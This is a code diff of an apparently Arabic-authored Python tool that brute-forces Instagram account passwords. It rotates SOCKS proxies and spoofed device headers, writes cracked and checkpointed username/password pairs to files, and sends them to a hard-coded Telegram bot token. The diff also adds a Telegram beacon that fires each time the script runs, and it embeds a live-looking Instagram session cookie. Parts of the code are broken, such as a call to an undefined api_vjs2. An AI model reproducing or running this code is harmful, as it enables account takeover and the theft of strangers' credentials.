@@ -34,10 +34,10 @@ import uuid
 import json
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from rich.console import Console
-
 token= '7547526933:AAHn5sTRbesNnb_e2EcKCzDc8LSqGbH8r_M'
 ID = '7327921791'
 # إزالة الرموز 
+requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=تم رصد عملية دخول-✵  ').text
 
 import urllib.parse
 from urllib.parse import quote
@@ -152,39 +152,40 @@ import bs4
 from rich.console import Console
 
 console = Console()
-def cek_DYNO(user, cookie_file_path):
+
+def cek_DYNO(user, cookie_string):
     session = requests.Session()
 
-    # قراءة الكوكيز من الملف
+    # تحويل الكوكيز من النص إلى شكل قابل للاستخدام
     try:
-        with open(cookie_file_path, 'r') as file:
-            kuki = file.read().strip()  # قراءة الكوكيز من الملف
+        cookies = {cookie.split('=')[0]: cookie.split('=')[1] for cookie in cookie_string.split('; ')}
     except Exception as e:
-        print(f"حدث خطأ أثناء قراءة الملف: {e}")
+        print(f"حدث خطأ أثناء معالجة الكوكيز: {e}")
         return
 
     # زيارة صفحة الملف الشخصي في Instagram باستخدام اسم المستخدم
     url = f"https://www.instagram.com/{user}/"
-    w = session.get(url, cookies={"cookie": kuki}).text
-    sop = bs4.BeautifulSoup(w, "html.parser")
-    
-    # استخراج عدد المتابعين من الميتا تاج
     try:
+        w = session.get(url, cookies=cookies).text
+        sop = bs4.BeautifulSoup(w, "html.parser")
+
+        # استخراج عدد المتابعين من الميتا تاج
         followers_count = sop.find('meta', property='og:description')['content']
         followers_count = followers_count.split(' ')[0]  # استخراج الرقم فقط
 
-        # استخراج الاسم الكامل من الميتا تاج (يتطلب بعض التعديلات)
+        # استخراج الاسم الكامل من الميتا تاج
         full_name = sop.find('meta', property='og:title')['content']
         full_name = full_name.split('•')[0].strip()  # استخراج الاسم الكامل قبل "•"
-        
-        console.print(f"\r\n[bold yellow]           ➛ followers : {B2}{followers_count}\n[bold yellow]           ➛ full name : {B2}{full_name}\n {J2}         𖣘─────────────────━﴾𓆩XD𓆪﴿━─────────────────𖣘            \n √√√√√√√√✓")
-        exit()
-        
+
+        console.print(f"\r\n[bold yellow]           ➛ followers : {followers_count}\n[bold yellow]           ➛ full name : {full_name}\n            𖣘─────────────────━﴾𓆩XD𓆪﴿━─────────────────𖣘            \n √√√√√√√√✓")
     except Exception as e:
         console.print(f"\r [red]  Error: {e}")
 
 # كيفية الاستخدام:
-cookie_file_path = '/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦/كوكيز.txt'  # المسار إلى الملف
+cookie_string = "datr=la91ZyugolYjsOk_hS3WaceC; ig_did=084282CC-A90C-498B-892B-DF0AD63ACE6C; dpr=1.6687500476837158; mid=Z3WvlgABAAF4Fvz0eROdgBTWK2n7; ig_nrcb=1; ps_l=1; ps_n=1; wd=432x887; csrftoken=ebfhNjqGZvxyMQumSq59U6jxc6Q8be6V; ds_user_id=63532616272; sessionid=63532616272%3AwspcHpCvG9EopT%3A10%3AAYe5bU3lawcfPKcY4neLvMs3afvRhGj4QfA3SE7NgA; rur=\"CLN\\05463532616272\\0541767321302:01f7f7b36b33b08ce79c7171b0c0a8945a7d9cda61df7477425740ca6c305d2c9e86ab8e\""
+
+
+# كيفية الاستخدام:
 
 def Menu():
     """Display the main menu."""
@@ -472,71 +473,83 @@ class Brute:
         __import__('os').remove('data/termux/internal/proxies.txt') ; sys.exit(0)
 
 
-    def ExecLogin(self, user, passwd, allData_akun = None, file = 'data/termux/internal/'):
-        uasu = []
+    def api_vjs(self, user, password, allData_akun=None, file='data/termux/internal/'):
         requ = Require()
         prox = requ.socks()
         byps = requests.Session()
         kont = random.randint
         uaig = requ.UserAgent()
-        Console().print(f' {B2}[{H2}+{B2}] 𝐓𝐄𝐀𝐌 <✵> 𝐀𝐑𝐖 : {H2}   ➛  {P2} ({H2}{self.lp}{P2}/{H2}{len(self.id)}{P2}) OK-:{H2}{self.ok}{P2}/CP-:{K2}{self.cp}{P2}/{P2}A2F-:{M2}{self.tw} ',end='\r') ; sys.stdout.flush()
-        while True:
+        Console().print(f' {B2}[{H2}+{B2}] 𝐓𝐄𝐀𝐌 <✵> 𝐀𝐑𝐖 𝚅3 : {H2}   ➛  {P2} ({H2}{self.lp}{P2}/{H2}{len(self.id)}{P2}) OK-:{H2}{self.ok}{P2}/CP-:{K2}{self.cp}{P2}/{P2}A2F-:{M2}{self.tw} ',end='\r') ; sys.stdout.flush()
+        for pswd in password:
             try:
-                headers = {'User-Agent': uaig,'X-DEVICE-ID': '%s'%(str(uuid.uuid4())),'X-CM-Bandwidth-KBPS': '-1.000','X-CM-Latency': '-1.000','X-IG-App-Locale': 'id_ID','X-IG-Device-Locale': 'id_ID','X-IG-Connection-Speed': f'{random.randint(1000, 3700)}kbps','X-IG-Bandwidth-Speed-KBPS': '-1.000','X-IG-Bandwidth-TotalBytes-B': '0','X-IG-Bandwidth-TotalTime-MS': '0','X-Bloks-Version-Id': '1b030ce63a06c25f3e4de6aaaf6802fe1e76401bc5ab6e5fb85ed6c2d333e0c7','X-MID': '' if byps.cookies.get('mid') is None else byps.cookies.get('mid'),'X-IG-WWW-Claim': '0','X-Bloks-Is-Layout-RTL': 'false','X-IG-Connection-Type': 'WIFI','X-IG-Capabilities': '3brTvwE=','X-IG-App-ID': '567067343352427','X-IG-Device-ID': '%s'%(str(uuid.uuid4())),'X-IG-Android-ID': requ.DeviceId(),'Accept-Language': 'id-ID','X-FB-HTTP-Engine': 'Liger','Host': 'i.instagram.com','Accept-Encoding': 'gzip','Connection': 'close'}
-                payload = {'post': '1','country_codes': '[{"country_code":"1","source":["default"]}]','phone_id':requ.poid(),'adid':requ.adid(user),'guid':requ.guid(),'device_id':requ.DeviceId(),'google_tokens': '[]','login_attempt_count': '0','username':user,'password':'JhonChenXU','queryParams': '{}','optIntoOneTap': 'false'}
-                cookies = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
-                break
-            except requests.exceptions.ConnectionError as e:
-                time.sleep(15) ; self.ExecLogin(user, passwd, allData_akun, file='data/termux/internal/')
-            except:pass
-        for pswd in passwd:
-            if pswd:
-               try:
-                   payload.update({'password':pswd})
-                   headers.update({'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',})
-                   data = json.dumps(payload)
-                   xnxx = requ.Signature(data)
-                   prok = {'http': 'socks5://' + random.choice(prox)}
-                   resp = byps.post('https://i.instagram.com/api/v1/accounts/login/', cookies = {'cookie':cookies}, data = xnxx, headers = headers, proxies = prok)
-                   if 'logged_in_user' in str(resp.text):
+                 resp = byps.get('https://www.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid='+str(uuid.uuid4()))
+                 prok = {'http': 'socks5://' + random.choice(prox)}
+                 data = json.dumps(
+                    {
+                       'phone_id': requ.poid(),
+                       'device_id': requ.DeviceId(),
+                       'guid': requ.guid(),
+                       'username': user,
+                       'password': pswd
+                    }
+                 )
+                 headers = {
+                     'Authority': 'api.instagram.com',
+                     'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                     'X-IG-Connection-Speed': f'{random.randint(100, 999)}kbps',
+                     'Accept': '*/*',
+                     'X-IG-Connection-Type': random.choice(['MOBILE(LTE)', 'WIFI']),
+                     'X-IG-App-ID': '936619743392459',
+                     'Accept-Language': 'id-ID',
+                     'X-IG-ABR-Connection-Speed-KBPS': '0',
+                     'User-Agent': uaig,
+                     'Connection': 'keep-alive',
+                     'X-IG-Capabilities': '36r/dw==',
+                     'Cookie': f'csrftoken={resp.cookies.get("csrftoken")};mid={resp.cookies.get("mid")};dpr=2'
+                 }
+                 cookies = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
+                 byps.headers.update({'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'})
+                 resp_data = requ.Signature(data)
+                 response = byps.post('https://i.instagram.com/api/v1/accounts/login/', data = resp_data, headers = headers, cookies = {'cookie':cookies}, proxies = prok)
+                 if 'logged_in_user' in str(response.text):
                        self.ok +=1
                        cookie = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
-                       followers, following, postingan, fulxxnam = self.friends_user(user)
+
                        if allData_akun is not None:
                           try:
-                              followers, following, postingan, fulmmnn, uidx, bio, pict, mutual, private, verifs, fbid, timelines, busi = self.all_dateee(user)
-                              print('\r                                                                        ')
-                              Console().print(f'''\r {H2}    𖣘────━﴾𓆩OK𓆪﴿━────𖣘          \n\n  {H2}users_id{P2}: {P2}{uidx}\n  {H2}fullname{P2}: {fulmmnn}\n  {H2}username{P2}: {A2}{user}  |  {H2}password{P2}: {A2}{pswd}\n  {H2}follower{P2}: {followers}  |  {H2}followed{P2}: {following}  |  {H2}feedpost{P2}: {postingan}\n  {H2}biogrphy{P2}: {bio}\n  {H2}mutualss{P2}: {mutual}\n  {H2}privates{P2}: {private}\n  {H2}verifeed{P2}: {verifs}\n  {H2}fbuserid{P2}: {fbid}\n  {H2}reel_vid{P2}: {timelines}\n  {H2}business{P2}: {busi}\n  {H2}saved_as{P2}: data/result/{H2}{hari_save}\n  {H2}csrtoken{P2}: {A2}{cookie}\n  {H2}userAgnt{P2}: {A2}{uaig}\n  {H2}urprofil{P2}: {N2}{pict}''')
-                              save = f'{user}|{pswd}|{cookie}\n'
+                              
+                              print('\r                                                                     ')
+                              
                           except Exception as e:
                                  print('\r                                                                        ')
-                                 Console().print(f'''\r {H2}         𖣘─────────────────━﴾𓆩OK𓆪﴿━─────────────────𖣘            \n\n           {H2}├ user: {B2}{user} {H2}| {H2}pass: {B2}{pswd}\n\n           {H2}├ OK{B2}: {self.ok} {J2}| {H2}following{B2}: {following}  \n\n           {H2}├ 𝙲𝙾𝙾𝙺𝙸𝙴𝚂└──> \033{cookie}\n\n {H2}         𖣘─────────────────━﴾𓆩XD𓆪﴿━─────────────────𖣘          \n\n''')
+                                 
                        else:                            
-                            print('\r                                                                        ')
+                        # استخدام القفل أثناء الكتابة
+                        with lock:
                             open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦/حسابات Ok-CP/حسابات-OK.txt', 'a').write(f'{user}|{pswd}\n{cookie}\n')
                             console.print(f"\r [bold green]         𖣘─────────────────━﴾𓆩OK𓆪﴿━─────────────────𖣘            \n[bold green]           ├ {user} | {pswd}\n[bold green]           ├ OK:{B2} {self.ok}\n[bold green][🌐]= 𝙲𝙾𝙾𝙺𝙸𝙴𝚂└──>{B2} {cookie}\n")
-                            requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str('✵ -OK : '+user+' ׀ '+pswd))
-                            cek_DYNO(user, cookie_file_path)
+                            cek_DYNO(user, cookie_string)
                             break
-                   elif 'two_factor_required' in str(resp.text):
-                        followers, following, postingan, fulxxnam = self.friends_user(user)
-                        print('\r                                                                     ')
-                        self.tw += 1
-                        console.print(f"\r {M2}         𖣘─────────────────━﴾𓆩A2F𓆪﴿━─────────────────𖣘            \n{M2}           ├ {user} | {pswd}\n{M2}           ├ A2F:{B2} {self.tw}\n {J2}         𖣘─────────────────━﴾𓆩XD𓆪﴿━─────────────────𖣘            \n √√√√√√√√✓")
-                        break
-                   elif 'https://i.instagram.com/challenge/' in str(resp.text):
-                        self.cp += 1
-                        open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦/حسابات Ok-CP/حسابات-CP.txt', 'a').write(f'{user}|{pswd}\n')
-                        console.print(f"\r {K2}         𖣘─────────────────━﴾𓆩CP𓆪﴿━─────────────────𖣘            \n[bold yellow]           ├ {user} | {pswd}\n[bold yellow]           ├ CP:{B2} {self.cp}\n")
-                        requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str('✵ -CP : '+user+' ׀ '+pswd))
-                        cek_DYNO(user, cookie_file_path)
-                        break
 
-               except requests.exceptions.ConnectionError as e:
-                   time.sleep(10) ; self.ExecLogin(user, passwd, allData_akun, file='data/termux/internal/')
+                
+                 elif 'two_factor_required' in str(response.text):
+                    self.tw += 1
+
+                    console.print(f"\r {M2}         𖣘─────────────────━﴾𓆩A2F𓆪﴿━─────────────────𖣘            \n{M2}           ├ {user} | {pswd}\n{M2}           ├ A2F:{B2} {self.tw}\n {J2}         𖣘─────────────────━﴾𓆩XD𓆪﴿━─────────────────𖣘            \n √√√√√√√√✓")
+                    break
+                 elif 'https://i.instagram.com/challenge/' in str(response.text):
+
+                    self.cp += 1
+                    open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦/حسابات Ok-CP/حسابات-CP.txt', 'a').write(f'{user}|{pswd}\n')
+                    console.print(f"\r {K2}         𖣘─────────────────━﴾𓆩CP𓆪﴿━─────────────────𖣘            \n[bold yellow]           ├ {user} | {pswd}\n[bold yellow]           ├ CP:{B2} {self.cp}\n")
+                    requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str('✵ -  : '+user+' ׀ '+pswd))
+                    cek_DYNO(user, cookie_string)
+                    break
+
+            except requests.exceptions.ConnectionError as e:
+               time.sleep(10) ; self.api_vjs2(user, password, allData_akun, file='data/termux/internal/')
         self.lp +=1
 
-    
 
 if __name__ == "__main__":
     try:
